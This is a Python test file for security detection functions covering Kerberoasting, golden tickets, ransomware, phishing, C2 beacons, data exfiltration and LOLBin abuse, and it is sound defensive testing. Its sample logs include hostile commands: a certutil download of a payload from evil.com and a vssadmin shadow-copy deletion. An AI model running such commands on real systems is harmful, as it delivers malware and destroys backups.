"""Tests for detection tools."""
import pytest
from tools.detection import (
    detect_kerberoasting, detect_golden_ticket, detect_ransomware,
    detect_phishing, detect_c2, detect_data_exfil, detect_lolbin_abuse,
)


class TestDetectKerberoasting:
    def test_attack(self):
        result = detect_kerberoasting({
            "title": "TGS Request", "source_ip": "10.0.1.50", "username": "svc_sql",
            "rule_name": "KerberoastingAttempt",
            "raw_log": "EventID=4769 TicketEncryptionType=0x17 ServiceName=MSSQLSvc/db01:1433 TargetUserName=svc_sql ClientAddress=10.0.1.50",
        })
        assert result["risk_score"] >= 70
        ioc_values = [i["value"] for i in result["iocs"]]
        assert "10.0.1.50" in ioc_values
        assert "svc_sql" in ioc_values

    def test_benign(self):
        result = detect_kerberoasting({
            "title": "Normal TGS", "source_ip": "10.0.1.10", "username": "admin",
            "rule_name": "KerberosAuth",
            "raw_log": "EventID=4769 TicketEncryptionType=0x12 ServiceName=krbtgt/CORP.LOCAL Status=0x0",
        })
        assert result["risk_score"] <= 30


class TestDetectGoldenTicket:
    def test_attack(self):
        result = detect_golden_ticket({
            "title": "Golden Ticket", "source_ip": "10.0.0.5", "username": "admin",
            "rule_name": "GoldenTicket",
            "raw_log": "EventID=4768 TicketEncryptionType=0x17 ServiceName=krbtgt/CORP.LOCAL TicketOptions=0x50800000 Lifetime=87600h",
        })
        assert result["risk_score"] >= 80

    def test_benign(self):
        result = detect_golden_ticket({
            "title": "Normal TGT", "source_ip": "10.0.1.10", "username": "user1",
            "rule_name": "KerberosAuth",
            "raw_log": "EventID=4768 TicketEncryptionType=0x12 Status=0x0",
        })
        assert result["risk_score"] <= 25


class TestDetectRansomware:
    def test_attack(self):
        result = detect_ransomware({
            "title": "Ransomware", "source_ip": "192.168.1.50", "username": "ws7",
            "rule_name": "Ransomware",
            "raw_log": "vssadmin delete shadows /all /quiet mass encryption .locked extension",
        })
        assert result["risk_score"] >= 85

    def test_benign(self):
        result = detect_ransomware({
            "title": "Backup", "source_ip": "10.0.0.1", "username": "backup",
            "rule_name": "Backup",
            "raw_log": "Backup completed successfully",
        })
        assert result["risk_score"] <= 20


class TestDetectPhishing:
    def test_attack(self):
        result = detect_phishing({
            "title": "Phishing", "source_ip": "203.0.113.50", "username": "finance",
            "rule_name": "Phishing",
            "raw_log": "Subject: URGENT wire transfer URL: http://company-secure-login.com/verify From: ceo@company-secure-login.com",
        })
        assert result["risk_score"] >= 70

    def test_benign(self):
        result = detect_phishing({
            "title": "Normal Email", "source_ip": "10.0.0.1", "username": "user",
            "rule_name": "Email",
            "raw_log": "Subject: Weekly report From: manager@company.com",
        })
        assert result["risk_score"] <= 25


class TestDetectC2:
    def test_attack(self):
        result = detect_c2({
            "title": "C2 Beacon", "source_ip": "10.0.0.50", "username": "ws3",
            "rule_name": "C2",
            "raw_log": "Beacon interval 30s to 198.51.100.77:443 DGA domain xk7f2m.evil.net connections=500 stddev=0.3",
        })
        assert result["risk_score"] >= 75

    def test_benign(self):
        result = detect_c2({
            "title": "Normal Traffic", "source_ip": "10.0.0.1", "username": "user",
            "rule_name": "Web",
            "raw_log": "HTTPS to www.google.com normal browsing",
        })
        assert result["risk_score"] <= 20


class TestDetectDataExfil:
    def test_attack(self):
        result = detect_data_exfil({
            "title": "Exfil", "source_ip": "10.0.0.100", "username": "contractor",
            "rule_name": "DataExfil",
            "raw_log": "1.5GB transferred to 198.51.100.50 via HTTPS at 02:30 off-hours encrypted",
        })
        assert result["risk_score"] >= 75

    def test_benign(self):
        result = detect_data_exfil({
            "title": "Upload", "source_ip": "10.0.0.1", "username": "admin",
            "rule_name": "Transfer",
            "raw_log": "50KB config uploaded to internal share",
        })
        assert result["risk_score"] <= 20


class TestDetectLolbinAbuse:
    def test_attack(self):
        result = detect_lolbin_abuse({
            "title": "LOLBin", "source_ip": "10.0.0.5", "username": "user1",
            "rule_name": "LOLBin",
            "raw_log": "certutil -urlcache -split -f http://evil.com/payload.bin C:\\Temp\\update.exe",
        })
        assert result["risk_score"] >= 75

    def test_benign(self):
        result = detect_lolbin_abuse({
            "title": "Certutil", "source_ip": "10.0.0.1", "username": "admin",
            "rule_name": "CertOp",
            "raw_log": "certutil -verify certificate.cer normal operation",
        })
        assert result["risk_score"] <= 25
